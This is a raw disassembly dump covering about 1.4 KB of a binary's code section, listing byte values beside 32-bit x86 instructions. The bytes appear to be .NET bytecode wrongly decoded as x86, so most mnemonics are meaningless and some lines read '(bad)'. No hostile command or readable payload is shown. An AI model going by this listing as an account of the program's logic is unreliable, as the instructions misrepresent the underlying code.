  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 48             	or     0x48(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	e2 01                	loop   0x403da7
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 4e                	jb     0x403e0f
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	39 a4 01 00 00 07 72 	cmp    %esp,0x72070000(%ecx,%eax,1)
  403dd7:	ae                   	scas   %es:(%edi),%al
  403dd8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ddd:	00 00                	add    %al,(%eax)
  403ddf:	0a 3a                	or     (%edx),%bh
  403de1:	25 00 00 00 07       	and    $0x7000000,%eax
  403de6:	72 b8                	jb     0x403da0
  403de8:	25 00 70 28 25       	and    $0x25287000,%eax
  403ded:	00 00                	add    %al,(%eax)
  403def:	0a 3a                	or     (%edx),%bh
  403df1:	60                   	pusha
  403df2:	00 00                	add    %al,(%eax)
  403df4:	00 07                	add    %al,(%edi)
  403df6:	72 c6                	jb     0x403dbe
  403df8:	25 00 70 28 25       	and    $0x25287000,%eax
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	0a 3a                	or     (%edx),%bh
  403e01:	d9 00                	flds   (%eax)
  403e03:	00 00                	add    %al,(%eax)
  403e05:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e08:	00 00                	add    %al,(%eax)
  403e0a:	16                   	push   %ss
  403e0b:	28 1a                	sub    %bl,(%edx)
  403e0d:	00 00                	add    %al,(%eax)
  403e0f:	06                   	push   %es
  403e10:	73 94                	jae    0x403da6
  403e12:	00 00                	add    %al,(%eax)
  403e14:	06                   	push   %es
  403e15:	25 72 4e 21 00       	and    $0x214e72,%eax
  403e1a:	70 6f                	jo     0x403e8b
  403e1c:	7f 00                	jg     0x403e1e
  403e1e:	00 06                	add    %al,(%esi)
  403e20:	72 ae                	jb     0x403dd0
  403e22:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e27:	00 00                	add    %al,(%eax)
  403e29:	06                   	push   %es
  403e2a:	25 72 66 21 00       	and    $0x216672,%eax
  403e2f:	70 6f                	jo     0x403ea0
  403e31:	7f 00                	jg     0x403e33
  403e33:	00 06                	add    %al,(%esi)
  403e35:	28 17                	sub    %dl,(%edi)
  403e37:	00 00                	add    %al,(%eax)
  403e39:	06                   	push   %es
  403e3a:	6a 6f                	push   $0x6f
  403e3c:	74 00                	je     0x403e3e
  403e3e:	00 06                	add    %al,(%esi)
  403e40:	6f                   	outsl  %ds:(%esi),(%dx)
  403e41:	89 00                	mov    %eax,(%eax)
  403e43:	00 06                	add    %al,(%esi)
  403e45:	28 20                	sub    %ah,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	16                   	push   %ss
  403e4b:	28 18                	sub    %bl,(%eax)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	06                   	push   %es
  403e50:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e53:	00 00                	add    %al,(%eax)
  403e55:	00 06                	add    %al,(%esi)
  403e57:	72 dc                	jb     0x403e35
  403e59:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e5e:	00 00                	add    %al,(%eax)
  403e60:	06                   	push   %es
  403e61:	6f                   	outsl  %ds:(%esi),(%dx)
  403e62:	8b 00                	mov    (%eax),%eax
  403e64:	00 06                	add    %al,(%esi)
  403e66:	28 42 00             	sub    %al,0x0(%edx)
  403e69:	00 06                	add    %al,(%esi)
  403e6b:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e6f:	00 7e 24             	add    %bh,0x24(%esi)
  403e72:	00 00                	add    %al,(%eax)
  403e74:	04 06                	add    $0x6,%al
  403e76:	6f                   	outsl  %ds:(%esi),(%dx)
  403e77:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e7c:	94                   	xchg   %eax,%esp
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	06                   	push   %es
  403e80:	25 72 4e 21 00       	and    $0x214e72,%eax
  403e85:	70 6f                	jo     0x403ef6
  403e87:	7f 00                	jg     0x403e89
  403e89:	00 06                	add    %al,(%esi)
  403e8b:	72 e4                	jb     0x403e71
  403e8d:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e92:	00 00                	add    %al,(%eax)
  403e94:	06                   	push   %es
  403e95:	25 72 fa 25 00       	and    $0x25fa72,%eax
  403e9a:	70 6f                	jo     0x403f0b
  403e9c:	7f 00                	jg     0x403e9e
  403e9e:	00 06                	add    %al,(%esi)
  403ea0:	06                   	push   %es
  403ea1:	72 dc                	jb     0x403e7f
  403ea3:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea8:	00 00                	add    %al,(%eax)
  403eaa:	06                   	push   %es
  403eab:	6f                   	outsl  %ds:(%esi),(%dx)
  403eac:	8b 00                	mov    (%eax),%eax
  403eae:	00 06                	add    %al,(%esi)
  403eb0:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb1:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb7:	00 00                	add    %al,(%eax)
  403eb9:	06                   	push   %es
  403eba:	28 20                	sub    %ah,(%eax)
  403ebc:	00 00                	add    %al,(%eax)
  403ebe:	06                   	push   %es
  403ebf:	38 06                	cmp    %al,(%esi)
  403ec1:	00 00                	add    %al,(%eax)
  403ec3:	00 06                	add    %al,(%esi)
  403ec5:	28 47 00             	sub    %al,0x0(%edi)
  403ec8:	00 06                	add    %al,(%esi)
  403eca:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403ed0:	b3 00                	mov    $0x0,%bl
  403ed2:	00 0a                	add    %cl,(%edx)
  403ed4:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed7:	00 06                	add    %al,(%esi)
  403ed9:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403edf:	72 08                	jb     0x403ee9
  403ee1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ee5:	7f 00                	jg     0x403ee7
  403ee7:	00 06                	add    %al,(%esi)
  403ee9:	6f                   	outsl  %ds:(%esi),(%dx)
  403eea:	8b 00                	mov    (%eax),%eax
  403eec:	00 06                	add    %al,(%esi)
  403eee:	06                   	push   %es
  403eef:	72 dc                	jb     0x403ecd
  403ef1:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef6:	00 00                	add    %al,(%eax)
  403ef8:	06                   	push   %es
  403ef9:	6f                   	outsl  %ds:(%esi),(%dx)
  403efa:	7a 00                	jp     0x403efc
  403efc:	00 06                	add    %al,(%esi)
  403efe:	28 41 00             	sub    %al,0x0(%ecx)
  403f01:	00 06                	add    %al,(%esi)
  403f03:	26 7e 24             	es jle 0x403f2a
  403f06:	00 00                	add    %al,(%eax)
  403f08:	04 28                	add    $0x28,%al
  403f0a:	01 00                	add    %eax,(%eax)
  403f0c:	00 2b                	add    %ch,(%ebx)
  403f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0f:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f14:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f18:	00 12                	add    %dl,(%edx)
  403f1a:	02 28                	add    (%eax),%ch
  403f1c:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f21:	09 72 dc             	or     %esi,-0x24(%edx)
  403f24:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f29:	00 00                	add    %al,(%eax)
  403f2b:	06                   	push   %es
  403f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f2d:	8b 00                	mov    (%eax),%eax
  403f2f:	00 06                	add    %al,(%esi)
  403f31:	06                   	push   %es
  403f32:	72 08                	jb     0x403f3c
  403f34:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f38:	7f 00                	jg     0x403f3a
  403f3a:	00 06                	add    %al,(%esi)
  403f3c:	6f                   	outsl  %ds:(%esi),(%dx)
  403f3d:	8b 00                	mov    (%eax),%eax
  403f3f:	00 06                	add    %al,(%esi)
  403f41:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f47:	12 00                	adc    (%eax),%al
  403f49:	00 00                	add    %al,(%eax)
  403f4b:	09 28                	or     %ebp,(%eax)
  403f4d:	47                   	inc    %edi
  403f4e:	00 00                	add    %al,(%eax)
  403f50:	06                   	push   %es
  403f51:	7e 24                	jle    0x403f77
  403f53:	00 00                	add    %al,(%eax)
  403f55:	04 09                	add    $0x9,%al
  403f57:	6f                   	outsl  %ds:(%esi),(%dx)
  403f58:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f5d:	12 02                	adc    (%edx),%al
  403f5f:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f65:	b3 dd                	mov    $0xdd,%bl
  403f67:	0e                   	push   %cs
  403f68:	00 00                	add    %al,(%eax)
  403f6a:	00 12                	add    %dl,(%edx)
  403f6c:	02 fe                	add    %dh,%bh
  403f6e:	16                   	push   %ss
  403f6f:	04 00                	add    $0x0,%al
  403f71:	00 1b                	add    %bl,(%ebx)
  403f73:	6f                   	outsl  %ds:(%esi),(%dx)
  403f74:	33 00                	xor    (%eax),%eax
  403f76:	00 0a                	add    %cl,(%edx)
  403f78:	dc dd                	(bad)
  403f7a:	0f 00 00             	sldt   (%eax)
  403f7d:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f80:	00 00                	add    %al,(%eax)
  403f82:	0a 28                	or     (%eax),%ch
  403f84:	49                   	dec    %ecx
  403f85:	00 00                	add    %al,(%eax)
  403f87:	06                   	push   %es
  403f88:	dd 00                	fldl   (%eax)
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 2a                	add    %ch,(%edx)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	41                   	inc    %ecx
  403f91:	4c                   	dec    %esp
  403f92:	00 00                	add    %al,(%eax)
  403f94:	00 00                	add    %al,(%eax)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	aa                   	stos   %al,%es:(%edi)
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	00 79 00             	add    %bh,0x0(%ecx)
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	23 01                	and    (%ecx),%eax
  403fa2:	00 00                	add    %al,(%eax)
  403fa4:	0f 00 00             	sldt   (%eax)
  403fa7:	00 31                	add    %dh,(%ecx)
  403fa9:	00 00                	add    %al,(%eax)
  403fab:	01 02                	add    %eax,(%edx)
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 68 01             	add    %ch,0x1(%eax)
  403fb2:	00 00                	add    %al,(%eax)
  403fb4:	57                   	push   %edi
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	00 bf 01 00 00 0e    	add    %bh,0xe000001(%edi)
	...
  403fc9:	00 00                	add    %al,(%eax)
  403fcb:	00 d2                	add    %dl,%dl
  403fcd:	01 00                	add    %eax,(%eax)
  403fcf:	00 d2                	add    %dl,%dl
  403fd1:	01 00                	add    %eax,(%eax)
  403fd3:	00 0f                	add    %cl,(%edi)
  403fd5:	00 00                	add    %al,(%eax)
  403fd7:	00 31                	add    %dh,(%ecx)
  403fd9:	00 00                	add    %al,(%eax)
  403fdb:	01 13                	add    %edx,(%ebx)
  403fdd:	30 0b                	xor    %cl,(%ebx)
  403fdf:	00 11                	add    %dl,(%ecx)
  403fe1:	01 00                	add    %eax,(%eax)
  403fe3:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fe6:	00 11                	add    %dl,(%ecx)
  403fe8:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fee:	72 dc                	jb     0x403fcc
  403ff0:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	06                   	push   %es
  403ff8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff9:	8b 00                	mov    (%eax),%eax
  403ffb:	00 06                	add    %al,(%esi)
  403ffd:	28 42 00             	sub    %al,0x0(%edx)
  404000:	00 06                	add    %al,(%esi)
  404002:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404008:	c0 00 00             	rolb   $0x0,(%eax)
  40400b:	0a 72 12             	or     0x12(%edx),%dh
  40400e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404012:	c1 00 00             	roll   $0x0,(%eax)
  404015:	0a 28                	or     (%eax),%ch
  404017:	c2 00 00             	ret    $0x0
  40401a:	0a 0a                	or     (%edx),%cl
  40401c:	7e 25                	jle    0x404043
  40401e:	00 00                	add    %al,(%eax)
  404020:	04 3a                	add    $0x3a,%al
  404022:	85 00                	test   %eax,(%eax)
  404024:	00 00                	add    %al,(%eax)
  404026:	20 00                	and    %al,(%eax)
  404028:	01 00                	add    %eax,(%eax)
  40402a:	00 72 2e             	add    %dh,0x2e(%edx)
  40402d:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404031:	d0 0f                	rorb   $1,(%edi)
  404033:	00 00                	add    %al,(%eax)
  404035:	02 28                	add    (%eax),%ch
  404037:	c3                   	ret
  404038:	00 00                	add    %al,(%eax)
  40403a:	0a 1f                	or     (%edi),%bl
  40403c:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  404042:	25 16 16 14 28       	and    $0x28141616,%eax
  404047:	c4 00                	les    (%eax),%eax
  404049:	00 0a                	add    %cl,(%edx)
  40404b:	a2 25 17 17 14       	mov    %al,0x14171725
  404050:	28 c4                	sub    %al,%ah
  404052:	00 00                	add    %al,(%eax)
  404054:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  40405a:	28 c4                	sub    %al,%ah
  40405c:	00 00                	add    %al,(%eax)
  40405e:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  404064:	28 c4                	sub    %al,%ah
  404066:	00 00                	add    %al,(%eax)
  404068:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40406e:	28 c4                	sub    %al,%ah
  404070:	00 00                	add    %al,(%eax)
  404072:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404078:	28 c4                	sub    %al,%ah
  40407a:	00 00                	add    %al,(%eax)
  40407c:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  404082:	28 c4                	sub    %al,%ah
  404084:	00 00                	add    %al,(%eax)
  404086:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40408c:	28 c4                	sub    %al,%ah
  40408e:	00 00                	add    %al,(%eax)
  404090:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  404096:	28 c4                	sub    %al,%ah
  404098:	00 00                	add    %al,(%eax)
  40409a:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  4040a0:	0a 28                	or     (%eax),%ch
  4040a2:	c6 00 00             	movb   $0x0,(%eax)
  4040a5:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040ab:	7e 25                	jle    0x4040d2
  4040ad:	00 00                	add    %al,(%eax)
  4040af:	04 7b                	add    $0x7b,%al
  4040b1:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040b7:	00 00                	add    %al,(%eax)
  4040b9:	04 06                	add    $0x6,%al
  4040bb:	28 06                	sub    %al,(%esi)
  4040bd:	00 00                	add    %al,(%eax)
  4040bf:	06                   	push   %es
  4040c0:	7e 0b                	jle    0x4040cd
  4040c2:	00 00                	add    %al,(%eax)
  4040c4:	04 7e                	add    $0x7e,%al
  4040c6:	10 00                	adc    %al,(%eax)
  4040c8:	00 04 02             	add    %al,(%edx,%eax,1)
  4040cb:	72 36                	jb     0x404103
  4040cd:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040d1:	7f 00                	jg     0x4040d3
  4040d3:	00 06                	add    %al,(%esi)
  4040d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040d6:	7a 00                	jp     0x4040d8
  4040d8:	00 06                	add    %al,(%esi)
  4040da:	7e 1e                	jle    0x4040fa
  4040dc:	00 00                	add    %al,(%eax)
  4040de:	04 7e                	add    $0x7e,%al
  4040e0:	08 00                	or     %al,(%eax)
  4040e2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040e5:	0f 00 00             	sldt   (%eax)
  4040e8:	04 7e                	add    $0x7e,%al
  4040ea:	04 00                	add    $0x0,%al
  4040ec:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040ef:	c8 00 00 0a          	enter  $0x0,$0xa
  4040f3:	28 48 00             	sub    %cl,0x0(%eax)
  4040f6:	00 06                	add    %al,(%esi)
  4040f8:	2a 00                	sub    (%eax),%al
  4040fa:	00 00                	add    %al,(%eax)
  4040fc:	1b 30                	sbb    (%eax),%esi
  4040fe:	03 00                	add    (%eax),%eax
  404100:	5c                   	pop    %esp
  404101:	00 00                	add    %al,(%eax)
  404103:	00 15 00 00 11 02    	add    %dl,0x2110000
  404109:	28 18                	sub    %bl,(%eax)
  40410b:	00 00                	add    %al,(%eax)
  40410d:	0a 03                	or     (%ebx),%al
  40410f:	28 ca                	sub    %cl,%dl
  404111:	00 00                	add    %al,(%eax)
  404113:	0a 39                	or     (%ecx),%bh
  404115:	0b 00                	or     (%eax),%eax
  404117:	00 00                	add    %al,(%eax)
  404119:	72 64                	jb     0x40417f
  40411b:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40411f:	cb                   	lret
  404120:	00 00                	add    %al,(%eax)
  404122:	0a 7a 03             	or     0x3(%edx),%bh
  404125:	7e 2c                	jle    0x404153
  404127:	00 00                	add    %al,(%eax)
  404129:	04 20                	add    $0x20,%al
  40412b:	50                   	push   %eax
  40412c:	c3                   	ret
  40412d:	00 00                	add    %al,(%eax)
  40412f:	73 cc                	jae    0x4040fd
  404131:	00 00                	add    %al,(%eax)
  404133:	0a 0a                	or     (%edx),%cl
  404135:	02 06                	add    (%esi),%al
  404137:	1f                   	pop    %ds
  404138:	20 6f cd             	and    %ch,-0x33(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404140:	00 00                	add    %al,(%eax)
  404142:	04 02                	add    $0x2,%al
  404144:	06                   	push   %es
  404145:	1f                   	pop    %ds
  404146:	40                   	inc    %eax
  404147:	6f                   	outsl  %ds:(%esi),(%dx)
  404148:	cd 00                	int    $0x0
  40414a:	00 0a                	add    %cl,(%edx)
  40414c:	7d 2b                	jge    0x404179
  40414e:	00 00                	add    %al,(%eax)
  404150:	04 dd                	add    $0xdd,%al
  404152:	0d 00 00 00 06       	or     $0x6000000,%eax
  404157:	39 06                	cmp    %eax,(%esi)
  404159:	00 00                	add    %al,(%eax)
  40415b:	00 06                	add    %al,(%esi)
  40415d:	6f                   	outsl  %ds:(%esi),(%dx)
  40415e:	33 00                	xor    (%eax),%eax
  404160:	00 0a                	add    %cl,(%edx)
  404162:	dc 2a                	fsubrl (%edx)
  404164:	01 10                	add    %edx,(%eax)
  404166:	00 00                	add    %al,(%eax)
  404168:	02 00                	add    (%eax),%al
  40416a:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  40416f:	0d 00 00 00 00       	or     $0x0,%eax
  404174:	1b 30                	sbb    (%eax),%esi
  404176:	05 00 15 01 00       	add    $0x11500,%eax
  40417b:	00 16                	add    %dl,(%esi)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	11 03                	adc    %eax,(%ebx)
  404181:	3a 0b                	cmp    (%ebx),%cl
  404183:	00 00                	add    %al,(%eax)
  404185:	00 72 ac             	add    %dh,-0x54(%edx)
  404188:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  40418c:	cf                   	iret
  40418d:	00 00                	add    %al,(%eax)
  40418f:	0a 7a 73             	or     0x73(%edx),%bh
  404192:	d0 00                	rolb   $1,(%eax)
  404194:	00 0a                	add    %cl,(%edx)
  404196:	0a 06                	or     (%esi),%al
  404198:	1f                   	pop    %ds
  404199:	20 6a 6f             	and    %ch,0x6f(%edx)
  40419c:	4e                   	dec    %esi
  40419d:	00 00                	add    %al,(%eax)
  40419f:	0a 73 d1             	or     -0x2f(%ebx),%dh
  4041a2:	00 00                	add    %al,(%eax)
